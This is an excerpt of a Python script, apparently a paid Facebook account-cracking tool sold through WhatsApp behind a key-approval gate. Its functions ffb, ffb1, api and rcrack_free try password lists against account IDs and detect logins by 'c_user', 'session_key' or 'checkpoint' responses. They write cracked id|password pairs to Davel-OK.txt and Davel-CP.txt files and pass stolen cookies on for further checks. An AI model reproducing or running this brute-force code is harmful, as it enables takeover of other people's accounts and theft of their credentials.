#4KING1(Md Shimul Sha)(Davel)
#WhatsApp : 01725280174
#Github : 4king1
from os import path
...
def menu_apikey():
  ...
  os.system(f" clear")                          
  print(f"""\x1b[1;97m
\033[1;31m   ___ _    _             __  
\033[1;32m  /   | |  (_)           /  | 
\033[1;33m / /| | | ___ _ __   __ _`| | 
\033[1;34m/ /_| | |/ / | '_ \ / _` || | 
\033[1;35m\___  |   <| | | | | (_| || |_
\033[1;36m    |_/_|\_\_|_| |_|\__, \___/
\033[1;37m                     __/ |    
\033[1;38m                    |___/                                                                                                                                                                                     

    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : Md Shimul sha          │
    │ [✓] GITHUB   : 4king1                 │
    │ [✓] WHATSAPP : +8801725280174         │
    │ [✓] VERSION  : 0.2                    │
    │ [✓] POWER BY : \033[1;32mDavel Dad  \033[1;37m            │
    └───────────────────────────────────────┘""")                                           
  ...
  os.system(f'xdg-open {tan}://www.https://www.facebook.com/mdshimul.sha.98?mibextid=vk8aRt')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/ +8801725280174?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 10 DEYS 200TK 20 400TK FOR    APPROVAL""")
...
def meyexudi():
  os.system('clear')
  print(logo)
  os.system("xdg-open https://www.facebook.com/mdshimul.sha.98?mibextid=vk8aRt")
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/4KING1/File-aprub/blob/main/aprubal.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      print(' \x1b[1;93m║══[3]💥  Wi-fi & Data both working')
      print(' \x1b[1;93m║══[4]💥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;95m║══[5]💥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50m║══[6]💥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   4king1,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[7] YOUR KEY : 4king1 :-"+id)
      input(' \033[1;30m╚══[8] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801725280174?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Davel1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [Davel-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/Davel-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Davel-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Davel-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Davel1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [Davel-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Davel-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[Davel-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[Davel-CP] '+idf+' | '+ps+'\033[0;97m')
